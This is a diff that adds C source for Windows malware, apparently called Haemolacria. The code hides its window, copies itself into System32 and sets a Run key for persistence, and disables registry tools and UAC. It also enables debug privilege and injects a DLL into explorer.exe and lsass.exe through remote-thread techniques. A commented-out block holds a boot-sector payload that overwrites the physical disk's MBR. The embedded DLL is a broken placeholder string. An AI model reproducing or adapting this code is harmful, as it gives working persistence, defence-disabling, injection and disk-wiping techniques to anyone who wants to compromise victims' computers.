@@ -1,0 +1,165 @@
+#include <Windows.h>
+#include <TlHelp32.h>
+//my condolences to anyone trying to read this
+typedef NTSTATUS(NTAPI* NtCreateThreadExDef) (OUT LPHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer);
+typedef NTSTATUS(NTAPI* RtlCreateUserThreadDef) (IN HANDLE hProcess, IN LPVOID lpSecurityDescriptor, IN DWORD dwCreateSuspended, IN DWORD dwStackZeroBits, IN OUT LPDWORD lpStackReserved, IN OUT LPDWORD lpStackCommit, IN LPVOID lpStartAddress, IN LPVOID lpParam, OUT LPHANDLE lpThreadHandle , OUT LPDWORD dwThreadID);
+typedef NTSTATUS(*RtlAdjustPrivilegeDef) (ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+typedef NTSTATUS(NTAPI* NtSetInformationProcessDef) (HANDLE, DWORD, PVOID, DWORD);
+VOID WriteHaemolacria() {
+	const static BYTE Haemolacria[] = "you know wht you need to do!;
+	DWORD dwAttribs = GetFileAttributesW(L"C:\\Windows\\Haemolacria.dll");
+	HANDLE hFile = CreateFileW(L"C:\\Windows\\Haemolacria.dll", FILE_WRITE_ACCESS, NULL, NULL, CREATE_NEW, 0, NULL);
+	WriteFile(hFile, Haemolacria, sizeof(Haemolacria), &dwAttribs, NULL);
+	CloseHandle(hFile);
+}
+
+LPVOID CDECL lmemset(LPVOID dest, BYTE value, SIZE_T len) {
+	for (INT i = 0; i < len; i++) ((BYTE*)dest)[i] = value;
+	return dest;
+}
+
+DWORD LookupProcessByName(LPCWSTR lpProcessName) {
+	DWORD dwProcessID = 0;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32W procEntry;
+	procEntry.dwSize = sizeof(PROCESSENTRY32W);
+
+	if (!Process32FirstW(hSnapshot, &procEntry)) goto failed;
+
+	for (;;) {
+		if (!Process32NextW(hSnapshot, &procEntry)) goto failed;
+		else if (!lstrcmpW(lpProcessName, procEntry.szExeFile)) {
+			dwProcessID = procEntry.th32ProcessID;
+			break;
+		}
+		else continue;
+	}
+
+failed:
+	if (!dwProcessID) SetLastError(ERROR_NOT_FOUND);
+	return dwProcessID;
+}
+
+VOID main() {
+	ShowWindow(GetConsoleWindow(), 0);
+	OSVERSIONINFOW VerInfo;
+	GetVersionExW(&VerInfo);
+	SYSTEMTIME SysTime;
+	GetSystemTime(&SysTime);
+	//if (VerInfo.dwMajorVersion < 6 && SysTime.wDay == 3 && SysTime.wMonth == 1) {
+	//		DWORD dwWank;
+	//		static const BYTE lpMBR[] = { 0x31, 0xC0, 0xCD, 0x1A, 0x31, 0xD1, 0x89, 0x0E, 0x2B, 0x7D, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xB8,
+	//		0x02, 0x00, 0xCD, 0x10, 0xBE, 0x2E, 0x7D, 0xAC, 0x08, 0xC0, 0x74, 0x06, 0xB4, 0x0E, 0xCD, 0x10,
+	//		0xEB, 0xF5, 0x31, 0xC0, 0xCD, 0x16, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x10, 0x10, 0xBB, 0x10,
+	//		0x00, 0xB9, 0x00, 0x00, 0xBA, 0x3F, 0x3F, 0xCD, 0x10, 0xB8, 0x10, 0x10, 0xBB, 0x00, 0x00, 0xB9,
+	//		0x00, 0x00, 0xB6, 0x00, 0xE8, 0xD7, 0x00, 0xCD, 0x10, 0x51, 0x31, 0xC9, 0xBB, 0x10, 0x00, 0x86,
+	//		0xF2, 0x80, 0x3E, 0x2D, 0x7D, 0x00, 0x74, 0x09, 0xFE, 0xC6, 0x80, 0xFE, 0x3F, 0x7D, 0x08, 0xEB,
+	//		0x0A, 0xFE, 0xCE, 0x08, 0xF6, 0x75, 0x04, 0xF6, 0x16, 0x2D, 0x7D, 0xCD, 0x10, 0x86, 0xF2, 0xBB,
+	//		0x00, 0x00, 0x59, 0x80, 0xF9, 0x3F, 0x7D, 0x04, 0xFE, 0xC1, 0xEB, 0xC8, 0x80, 0xFD, 0x3F, 0x7D,
+	//		0x04, 0xFE, 0xC5, 0xEB, 0xBF, 0x80, 0xFE, 0x3F, 0x7D, 0x04, 0xFE, 0xC6, 0xEB, 0xB6, 0xE8, 0x8D,
+	//		0x00, 0xCD, 0x10, 0x51, 0x31, 0xC9, 0xBB, 0x10, 0x00, 0x86, 0xF2, 0x80, 0x3E, 0x2D, 0x7D, 0x00,
+	//		0x74, 0x09, 0xFE, 0xC6, 0x80, 0xFE, 0x3F, 0x7D, 0x08, 0xEB, 0x0A, 0xFE, 0xCE, 0x08, 0xF6, 0x75,
+	//		0x04, 0xF6, 0x16, 0x2D, 0x7D, 0xCD, 0x10, 0x86, 0xF2, 0xBB, 0x00, 0x00, 0x59, 0x08, 0xC9, 0x74,
+	//		0x04, 0xFE, 0xC9, 0xEB, 0xC9, 0x08, 0xED, 0x74, 0x04, 0xFE, 0xCD, 0xEB, 0xC1, 0x08, 0xF6, 0x74,
+	//		0x04, 0xFE, 0xCE, 0xEB, 0xB9, 0xB9, 0xF4, 0x01, 0xE8, 0x1F, 0x00, 0x8B, 0x3E, 0x2B, 0x7D, 0xB2,
+	//		0x10, 0x26, 0x88, 0x15, 0x47, 0x26, 0x88, 0x15, 0x81, 0xC7, 0x40, 0x01, 0x26, 0x88, 0x15, 0x4F,
+	//		0x26, 0x88, 0x15, 0x49, 0x0F, 0x84, 0x41, 0xFF, 0xEB, 0xDE, 0x53, 0x8B, 0x1E, 0x2B, 0x7D, 0xC1,
+	//		0xE3, 0x07, 0x31, 0x1E, 0x2B, 0x7D, 0x8B, 0x1E, 0x2B, 0x7D, 0xC1, 0xEB, 0x09, 0x31, 0x1E, 0x2B,
+	//		0x7D, 0x8B, 0x1E, 0x2B, 0x7D, 0xC1, 0xE3, 0x08, 0x31, 0x1E, 0x2B, 0x7D, 0x5B, 0xC3, 0x60, 0xB9,
+	//		0x00, 0x00, 0xBA, 0x00, 0x02, 0xB4, 0x86, 0xCD, 0x15, 0x61, 0xC3, 0x00, 0x00, 0x00, 0x59, 0x65,
+	//		0x61, 0x72, 0x73, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x63, 0x6F, 0x6D, 0x65, 0x0A, 0x0D, 0x59,
+	//		0x65, 0x61, 0x72, 0x73, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x67, 0x6F, 0x0A, 0x0D, 0x4B, 0x69,
+	//		0x6E, 0x67, 0x64, 0x6F, 0x6D, 0x73, 0x20, 0x72, 0x69, 0x73, 0x65, 0x20, 0x61, 0x6E, 0x64, 0x20,
+	//		0x66, 0x61, 0x6C, 0x6C, 0x0A, 0x0D, 0x54, 0x68, 0x65, 0x20, 0x74, 0x69, 0x6D, 0x65, 0x20, 0x68,
+	//		0x61, 0x73, 0x20, 0x63, 0x6F, 0x6D, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x74, 0x61, 0x6B, 0x65, 0x20,
+	//		0x63, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x0A, 0x0D, 0x54, 0x68, 0x65, 0x20, 0x77, 0x6F, 0x72,
+	//		0x6C, 0x64, 0x20, 0x62, 0x65, 0x6C, 0x6F, 0x6E, 0x67, 0x73, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x73,
+	//		0x0A, 0x0A, 0x0D, 0x57, 0x69, 0x6E, 0x33, 0x32, 0x2E, 0x48, 0x61, 0x65, 0x6D, 0x6F, 0x6C, 0x61,
+	//		0x63, 0x72, 0x69, 0x61, 0x20, 0x62, 0x79, 0x20, 0x4E, 0x75, 0x6C, 0x6C, 0x45, 0x78, 0x63, 0x65,
+	//		0x70, 0x74, 0x69, 0x6F, 0x6E, 0x0A, 0x0D, 0x0A, 0xB0, 0xB1, 0xB2, 0x50, 0x72, 0x65, 0x73, 0x73,
+	//		0x20, 0x61, 0x6E, 0x79, 0x20, 0x6B, 0x65, 0x79, 0xB2, 0xB1, 0xB0, 0x00, 0x00, 0x00, 0x00, 0x00,
+	//		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	//		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };
+	//		HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+	//		WriteFile(hDisk, lpMBR, 512, &dwWank, NULL);
+	//		Sleep(200);
+	//}
+	WriteHaemolacria();
+	const CHAR lpHaemoDLL[] = "Haemolacria.dll\0";
+	/*HMODULE hHaemoDLL = LoadLibraryA(lpHaemoDLL);
+	GetProcAddress(hHaemoDLL, "WhoAreYou")();*/
+	HANDLE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+	HANDLE hNtdll = GetModuleHandleW(L"ntdll.dll");
+	HANDLE hSTDOUT = GetStdHandle(STD_OUTPUT_HANDLE);
+	FARPROC lpLoadLib = GetProcAddress(hKernel32, "LoadLibraryA");
+	FARPROC lpLastErr = GetProcAddress(hKernel32, "GetLastError");
+	DWORD dwDump;
+	LPWSTR lpPrintfBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 512);
+
+	WCHAR lpFilename[MAX_PATH];
+	GetModuleFileNameW(NULL, lpFilename, MAX_PATH);
+	CopyFileW(lpFilename, L"C:\\Windows\\System32\\hldr.exe", 1);
+	HKEY hKey;
+	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+	RegSetValueExW(hKey, L"Haemolacria", NULL, REG_SZ, L"C:\\Windows\\System32\\hldr.exe", 58);
+	RegCloseKey(hKey);
+	dwDump = 1;
+	RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey);
+	RegSetValueExW(hKey, L"DisableRegistryTools", NULL, REG_DWORD, &dwDump, sizeof(DWORD));
+	dwDump = 0;
+	RegCloseKey(hKey);
+	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey);
+	RegSetValueExW(hKey, L"EnableLUA", NULL, REG_DWORD, &dwDump, sizeof(DWORD));
+	RegCloseKey(hKey);
+
+	NtCreateThreadExDef NtCreateThreadEx = GetProcAddress(hNtdll, "NtCreateThreadEx");
+	RtlCreateUserThreadDef RtlCreateUserThread = GetProcAddress(hNtdll, "RtlCreateUserThread");
+	RtlAdjustPrivilegeDef RtlAdjustPrivilege = GetProcAddress(hNtdll, "RtlAdjustPrivilege");
+	NtSetInformationProcessDef NtSetInformationProcess = GetProcAddress(hNtdll, "NtSetInformationProcess");
+	RtlAdjustPrivilege(20, 1, 0, &dwDump);
+	WriteConsoleW(hSTDOUT, "Got privs!\n", 11, NULL, NULL);
+
+	DWORD dwMsPid = LookupProcessByName(L"explorer.exe");
+	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_SET_INFORMATION, 0, dwMsPid);
+	dwDump = 1;
+	NtSetInformationProcess(hProcess, 29, &dwDump, sizeof(DWORD));
+	LPVOID lpFarArguments = VirtualAllocEx(hProcess, NULL, sizeof(lpHaemoDLL), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	WriteProcessMemory(hProcess, lpFarArguments, lpHaemoDLL, sizeof(lpHaemoDLL), NULL);
+	HANDLE hInjectDLL = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLib, lpFarArguments, 0, NULL);
+	DWORD dwInjectDLLError;
+	if (hInjectDLL) WaitForSingleObject(hInjectDLL, 2000);
+	HANDLE hLasterrorThread = CreateRemoteThread(hProcess, NULL, 0, lpLastErr, NULL, 0, NULL);
+	GetExitCodeThread(hLasterrorThread, &dwInjectDLLError);
+	if (dwInjectDLLError == 8) {
+		if (NtCreateThreadEx) NtCreateThreadEx(&hInjectDLL, THREAD_TERMINATE | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, NULL, hProcess, lpLoadLib, lpFarArguments, 0, NULL, NULL, NULL, NULL);
+		else RtlCreateUserThread(hProcess, NULL, 0, 0, NULL, NULL, lpLoadLib, lpFarArguments, &hInjectDLL, NULL);
+		Sleep(200);
+		SuspendThread(hInjectDLL);
+		ResumeThread(hInjectDLL);
+		dwInjectDLLError = 0;
+	}
+
+	hInjectDLL = NULL;
+	dwMsPid = LookupProcessByName(L"lsass.exe");
+	hProcess = 0;
+	
+		hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ, 0, dwMsPid);
+		DWORD shit = GetLastError();
+		WCHAR* Ass = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 200);
+		wsprintfW(Ass, L"lasterror: %u", shit);
+		if (!hProcess) MessageBoxW(NULL, Ass, L"a", 0);
+	
+	lpFarArguments = VirtualAllocEx(hProcess, NULL, sizeof(lpHaemoDLL), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	WriteProcessMemory(hProcess, lpFarArguments, lpHaemoDLL, sizeof(lpHaemoDLL), NULL);
+	hInjectDLL = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLib, lpFarArguments, 0, NULL);
+	hLasterrorThread = CreateRemoteThread(hProcess, NULL, 0, lpLastErr, NULL, 0, NULL);
+	GetExitCodeThread(hLasterrorThread, &dwInjectDLLError);
+	//if (!hInjectDLL) {
+		if (NtCreateThreadEx) NtCreateThreadEx(&hInjectDLL, THREAD_TERMINATE | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, NULL, hProcess, lpLoadLib, lpFarArguments, 0, NULL, NULL, NULL, NULL);
+		else RtlCreateUserThread(hProcess, NULL, 0, 0, NULL, NULL, lpLoadLib, lpFarArguments, &hInjectDLL, NULL);
+		Sleep(200);
+		SuspendThread(hInjectDLL);
+		ResumeThread(hInjectDLL);
+		ExitProcess(0);
+	//}
+}
